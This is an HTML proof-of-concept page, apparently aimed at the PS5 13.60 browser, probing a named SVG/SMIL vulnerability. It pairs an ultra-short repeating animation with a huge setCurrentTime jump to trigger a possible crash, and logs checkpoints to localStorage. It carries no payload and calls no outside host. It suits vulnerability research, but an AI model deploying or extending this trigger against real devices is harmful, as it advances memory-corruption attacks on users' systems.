<!doctype html>
<meta charset="utf-8">
<title>PS5 13.60 - V37 SVG/SMIL regression probe</title>

<style>
body {
    background:#101010;
    color:#eee;
    font:18px monospace;
    padding:24px;
}
button {
    font:20px monospace;
    padding:14px 22px;
    margin:8px;
}
#log {
    white-space:pre-wrap;
    margin-top:20px;
}
</style>

<h2>PS5 13.60 — V37</h2>
<p>CVE-2026-65341 SVG/SMIL regression probe</p>

<button id="control">CONTROL</button>
<button id="trigger">TRIGGER ONCE</button>

<svg id="svg"
     width="200"
     height="100"
     xmlns="http://www.w3.org/2000/svg">

    <rect x="10" y="20"
          width="40" height="40"
          fill="white">

        <animate id="anim"
                 attributeName="x"
                 from="10"
                 to="150"
                 dur="0.0001s"
                 repeatCount="indefinite"/>
    </rect>
</svg>

<pre id="log">STATUS: READY</pre>

<script>
"use strict";

const log = document.querySelector("#log");
const svg = document.querySelector("#svg");

let used = false;

function checkpoint(s) {
    log.textContent += "\n" + s;

    try {
        localStorage.setItem("V37_LAST", s);
    } catch (_) {}
}

try {
    const old = localStorage.getItem("V37_LAST");
    if (old)
        checkpoint("PREVIOUS: " + old);
} catch (_) {}

checkpoint("SVGElement = " + typeof SVGElement);
checkpoint(
    "setCurrentTime = " +
    typeof svg.setCurrentTime
);

document.querySelector("#control").onclick = () => {

    checkpoint("CONTROL_ENTER");

    try {
        svg.setCurrentTime(1);

        checkpoint("CONTROL_SETCURRENTTIME_RETURNED");

        requestAnimationFrame(() => {
            checkpoint("CONTROL_SURVIVED_FRAME");
        });

    } catch (e) {
        checkpoint(
            "CONTROL_EXCEPTION: " +
            e.name + ": " + e.message
        );
    }
};

document.querySelector("#trigger").onclick = () => {

    if (used) {
        checkpoint("TRIGGER_BLOCKED_ALREADY_USED");
        return;
    }

    used = true;

    checkpoint("TRIGGER_ENTER");

    try {

        checkpoint("BEFORE_LARGE_TIME_JUMP");

        /*
         * Public upstream regression condition:
         *
         * extremely short repeating SMIL animation
         * followed by a very large timeline jump.
         */

        svg.setCurrentTime(400000);

        checkpoint("SETCURRENTTIME_RETURNED");

        queueMicrotask(() => {
            checkpoint("SURVIVED_MICROTASK");
        });

        requestAnimationFrame(() => {

            checkpoint("SURVIVED_FRAME");

            setTimeout(() => {
                checkpoint("V37_COMPLETE");
            }, 1000);

        });

    } catch (e) {

        checkpoint(
            "TRIGGER_EXCEPTION: " +
            e.name + ": " + e.message
        );
    }
};
</script>
